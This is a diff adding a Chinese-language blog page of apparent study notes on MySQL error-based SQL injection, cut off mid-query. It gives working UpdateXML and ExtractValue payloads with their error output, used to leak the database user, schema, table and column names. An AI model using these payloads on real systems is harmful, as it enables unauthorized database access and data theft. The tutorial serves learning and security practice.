@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"/>
+
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="SQL注入mysql内置变量及函数： 12show global variables;查看所有变量  可以直接调用mysql的函数来获取目标数据, 报错注入前提:后端直接输出报错, 常用函数:CONCAT()">
+<meta property="og:type" content="article">
+<meta property="og:title" content="24-11-22-sql注入学习">
+<meta property="og:url" content="http://example.com/2024/12/07/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/index.html">
+<meta property="og:site_name" content="坠入极夜的夏的博客">
+<meta property="og:description" content="SQL注入mysql内置变量及函数： 12show global variables;查看所有变量  可以直接调用mysql的函数来获取目标数据, 报错注入前提:后端直接输出报错, 常用函数:CONCAT()">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-12-07T12:45:52.000Z">
+<meta property="article:modified_time" content="2024-12-07T06:48:09.885Z">
+<meta property="article:author" content="坠入极夜的夏">
+<meta property="article:tag" content="学习笔记">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://example.com/2024/12/07/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2024/12/07/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/","path":"2024/12/07/sql注入基础/","title":"24-11-22-sql注入学习"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>24-11-22-sql注入学习 | 坠入极夜的夏的博客</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+<script src="https://t0uzi.github.io/live2d/autoload.js"></script>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">坠入极夜的夏的博客</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section">首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section">标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section">分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section">归档</a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section">日程表</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section">关于</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section">links</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.</span> <span class="nav-text">报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E6%8F%90"><span class="nav-number">1.1.0.1.</span> <span class="nav-text">前提:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="nav-number">1.1.0.2.</span> <span class="nav-text">常用函数:</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#CONCAT"><span class="nav-number">1.1.0.2.1.</span> <span class="nav-text">CONCAT()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#UpdateXML"><span class="nav-number">1.1.0.2.2.</span> <span class="nav-text">UpdateXML()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ExtractValue"><span class="nav-number">1.1.0.2.3.</span> <span class="nav-text">ExtractValue()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#floor"><span class="nav-number">1.1.0.2.4.</span> <span class="nav-text">floor()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#exp"><span class="nav-number">1.1.0.2.5.</span> <span class="nav-text">exp()</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.</span> <span class="nav-text">宽字节注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="nav-number">1.2.0.1.</span> <span class="nav-text">原理：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BC%96%E7%A0%81"><span class="nav-number">1.2.0.2.</span> <span class="nav-text">编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GBK"><span class="nav-number">1.2.0.3.</span> <span class="nav-text">(GBK)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.</span> <span class="nav-text">联合注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E6%8F%90-1"><span class="nav-number">1.3.0.1.</span> <span class="nav-text">前提</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#UNION-SELECT"><span class="nav-number">1.3.0.2.</span> <span class="nav-text">UNION SELECT</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.4.</span> <span class="nav-text">盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%87%BD%E6%95%B0"><span class="nav-number">1.4.0.1.</span> <span class="nav-text">函数:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#boolian%E5%9E%8B-%E5%B8%83%E5%B0%94-%E6%97%B6%E9%97%B4%E5%9E%8B"><span class="nav-number">1.4.0.2.</span> <span class="nav-text">boolian型(布尔)&amp;时间型</span></a></li></ol></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="坠入极夜的夏"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">坠入极夜的夏</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/t0uzi" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;t0uzi" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:2104923035@qq.com" title="E-Mail → mailto:2104923035@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+
+<!--音乐播放器-->
+  <aside class="sidebar">
+      <div class="sidebar-inner">   <!--从下面开始复制，粘贴到这里-->
+    <!-- require APlayer -->
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+        <script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+        <!-- require MetingJS-->
+        <script src="https://cdn.jsdelivr.net/npm/meting@1.2/dist/Meting.min.js"></script>
+    	<!--网易云-->
+
+    	<!--data-id="4916164702";"11860849周杰伦375"-->
+
+        <div class="aplayer"
+          data-id="4916164702"
+          data-server="netease"
+          data-type="playlist"
+          data-fixed="false"
+          data-autoplay="false"
+          data-list-folded="true"
+          data-mutex="true"
+          data-order="random"
+          data-loop="all"
+          data-volume="0.4"
+          data-theme="#FADFA3"
+          date-preload="auto" >
+        </div>
+
+
+  </aside>
+
+  <!--IP地址显示-->
+  <!--<img src="https://tool.lu/netcard/">-->
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/12/07/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="坠入极夜的夏">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="坠入极夜的夏的博客">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="24-11-22-sql注入学习 | 坠入极夜的夏的博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          24-11-22-sql注入学习
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-12-07 14:45:52 / 修改时间：08:48:09" itemprop="dateCreated datePublished" datetime="2024-12-07T14:45:52+02:00">2024-12-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>13k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>12 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>mysql内置变量及函数：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables;</span><br><span class="line">查看所有变量</span><br></pre></td></tr></table></figure>
+
+<p>可以直接调用mysql的函数来获取目标数据,</p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h4 id="前提"><a href="#前提" class="headerlink" title="前提:"></a>前提:</h4><p>后端直接输出报错,</p>
+<h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数:"></a>常用函数:</h4><h5 id="CONCAT"><a href="#CONCAT" class="headerlink" title="CONCAT()"></a>CONCAT()</h5><span id="more"></span>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">拼接函数,concat只能拼接字符串,不能拼接多行数据</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> concat(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------+</span></span><br><span class="line"><span class="operator">|</span> concat(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;b&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>a2b                    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------+</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="UpdateXML"><a href="#UpdateXML" class="headerlink" title="UpdateXML()"></a>UpdateXML()</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">updatexml(XML_document,XPath_string,new_vakue):</span><br><span class="line">替换一个xml文档中的内容</span><br><span class="line"><span class="keyword">UPDATE</span> products</span><br><span class="line"><span class="keyword">SET</span> product_info <span class="operator">=</span> UPDATEXML(product_info, <span class="string">&#x27;/product/price&#x27;</span>, <span class="string">&#x27;&lt;price&gt;123&lt;/price&gt;&#x27;</span>)</span><br><span class="line"><span class="keyword">WHERE</span> EXTRACTVALUE(product_info, <span class="string">&#x27;/product/id&#x27;</span>) <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">该语句会在存在xml类型数据的products表中搜索<span class="operator">/</span>product<span class="operator">/</span>id<span class="operator">=</span><span class="number">1</span>字段的数据,将其中的<span class="operator">/</span>product<span class="operator">/</span>price标签内的内容改为<span class="number">123</span></span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> updatexml(<span class="string">&#x27;&lt;a&gt;aaa&lt;/a&gt;&#x27;</span>,<span class="string">&#x27;/a&#x27;</span>,<span class="string">&#x27;bbb&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> updatexml(<span class="string">&#x27;&lt;a&gt;aaa&lt;/a&gt;&#x27;</span>,<span class="string">&#x27;/a&#x27;</span>,<span class="string">&#x27;bbb&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------+ </span></span><br><span class="line"><span class="operator">|</span> bbb                                <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------+</span></span><br><span class="line"><span class="comment">-----------------------------------------</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> updatexml(<span class="string">&#x27;&lt;a&gt;a&lt;/a&gt;&#x27;</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;@localhost&#x27;</span></span><br><span class="line"><span class="comment">-----------------------------------------</span></span><br><span class="line">虽然这里的aaa可以成功替换,但在我们查看version或<span class="keyword">user</span>等信息时,可以发现报错泄露出的信息不全,没有完全展示我们想要的信息,</span><br><span class="line">原因:当我们执行这个语句时,()内的内容会优先执行,这样一来我们的语句就变成了</span><br><span class="line"><span class="keyword">SELECT</span> UPDATExml(<span class="string">&#x27;&lt;a&gt;a&lt;/a&gt;&#x27;</span>, <span class="string">&#x27;user@localhost&#x27;</span>, <span class="string">&#x27;a&#x27;</span>);由于在XPath中 表达式 <span class="keyword">user</span><span class="variable">@localhost</span> 是无效的，因为 @ 符号在 XPath 中有特殊的含义，表示属性选择器,所以XPath会在他无法解析的地方报错,因此会返回<span class="variable">@localhost</span>,但我们可以用concat()主动添加XPath中无法被识别的字符，从而规避这一情况</span><br><span class="line"><span class="comment">-----------------------------------------</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> updatexml(<span class="string">&#x27;&lt;a&gt;a&lt;/a&gt;&#x27;</span>,concat(<span class="string">&#x27;&gt;&#x27;</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="string">&#x27;&lt;&#x27;</span>),<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;&gt;root@localhost&lt;&#x27;</span></span><br><span class="line"><span class="comment">-----------------------------------------</span></span><br><span class="line">这样虽然XPath依然不能识别这个表达式,但是他会把`<span class="operator">&gt;</span>root<span class="variable">@localhost</span><span class="operator">&lt;</span>`作为一个整体输出而不是将`root<span class="variable">@localhost</span>`中的@作为属性选择器解析,导致root被吞</span><br><span class="line"><span class="comment">-----------------------------------------</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> updatexml(<span class="string">&#x27;&lt;a&gt;a&lt;/a&gt;&#x27;</span>,concat(<span class="string">&#x27;&gt;&#x27;</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="string">&#x27;&lt;&#x27;</span>),<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;&gt;root@localhost&lt;&#x27;</span></span><br><span class="line"><span class="comment">-----------------------------------------</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> updatexml(<span class="string">&#x27;&lt;a&gt;a&lt;/a&gt;&#x27;</span>,concat(<span class="string">&#x27;&gt;&#x27;</span>,(<span class="keyword">select</span> group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata),<span class="string">&#x27;&lt;&#x27;</span>),<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;&gt;information_schema,aaaaaa,cms,c&#x27;</span></span><br><span class="line"><span class="comment">-----------------------------------------</span></span><br><span class="line">由于UpdateXMLe一次只能查询<span class="number">32</span>位长度的数据,所以当我们获得数据后可以用`xxx <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>)`来过滤掉已知数据</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> updatexml(<span class="string">&#x27;&lt;a&gt;a&lt;/a&gt;&#x27;</span>,concat(<span class="string">&#x27;&gt;&#x27;</span>,(<span class="keyword">select</span> group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata <span class="keyword">where</span> schema_name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;information_schema&#x27;</span>,<span class="string">&#x27;aaaaaa&#x27;</span>,<span class="string">&#x27;cms&#x27;</span>,<span class="string">&#x27;c&#x27;</span>)),<span class="string">&#x27;&lt;&#x27;</span>),<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;&gt;ctftraining,localhost,mysql,per&#x27;</span></span><br><span class="line"><span class="comment">-----------------------------------------</span></span><br><span class="line"><span class="keyword">select</span> updatexml(<span class="string">&#x27;&lt;a&gt;&lt;b&gt;123&lt;/b&gt;&lt;/a&gt;&#x27;</span>,concat(<span class="string">&#x27;&gt;&#x27;</span>,(<span class="keyword">select</span> group_concat(image_id,image_user_name) <span class="keyword">from</span> users.image_upload <span class="keyword">where</span> image_id <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;37&#x27;</span>)),<span class="string">&#x27;&lt;&#x27;</span>),<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line">XML_document:为string形式,XML文档对象的名称,</span><br><span class="line">XPath_string:XPath语法,</span><br><span class="line">new_vakue:替换目标,</span><br></pre></td></tr></table></figure>
+
+<h5 id="ExtractValue"><a href="#ExtractValue" class="headerlink" title="ExtractValue()"></a>ExtractValue()</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> extractvalue(<span class="string">&#x27;&lt;a&gt;123&lt;/a&gt;&#x27;</span>,<span class="string">&#x27;/a&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> extractvalue(<span class="string">&#x27;&lt;a&gt;123&lt;/a&gt;&#x27;</span>,<span class="string">&#x27;/a&#x27;</span>) 		   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">123</span>                                      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------+</span></span><br><span class="line">语法与updatexml类似,作用是从xml数据中搜索指定标签内的数据</span><br><span class="line"><span class="comment">-----------------------------------------</span></span><br><span class="line">获取数据库名</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> extractvalue(<span class="string">&#x27;&lt;a&gt;&lt;b&gt;123&lt;/b&gt;&lt;/a&gt;&#x27;</span>,concat(<span class="string">&#x27;&gt;&#x27;</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>),<span class="string">&#x27;&lt;&#x27;</span>));</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;&gt;information_schema&lt;&#x27;</span></span><br><span class="line"><span class="comment">-----------------------------------------</span></span><br><span class="line">获取数据库内的表名</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> extractvalue(<span class="string">&#x27;&lt;a&gt;&lt;b&gt;123&lt;/b&gt;&lt;/a&gt;&#x27;</span>,concat(<span class="string">&#x27;&gt;&#x27;</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.table</span><br><span class="line">s <span class="keyword">where</span> table_schema <span class="operator">=</span> <span class="string">&#x27;users&#x27;</span>),<span class="string">&#x27;&lt;&#x27;</span>));</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;&gt;image_upload,users&lt;&#x27;</span></span><br><span class="line"><span class="comment">-----------------------------------------</span></span><br><span class="line">获取表内字段名</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> extractvalue(<span class="string">&#x27;&lt;a&gt;&lt;b&gt;123&lt;/b&gt;&lt;/a&gt;&#x27;</span>,concat(<span class="string">&#x27;&gt;&#x27;</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;user&#x27;</span>),<span class="string">&#x27;&lt;&#x27;</span>));</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;&gt;Host,User,Select_priv,Insert_pr&#x27;</span></span><br><span class="line"><span class="comment">-----------------------------------------</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> extractvalue(<span class="string">&#x27;&lt;a&gt;&lt;b&gt;123&lt;/b&gt;&lt;/a&gt;&#x27;</span>,concat(<span class="string">&#x27;&gt;&#x27;</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;image_upload&#x27;</span> 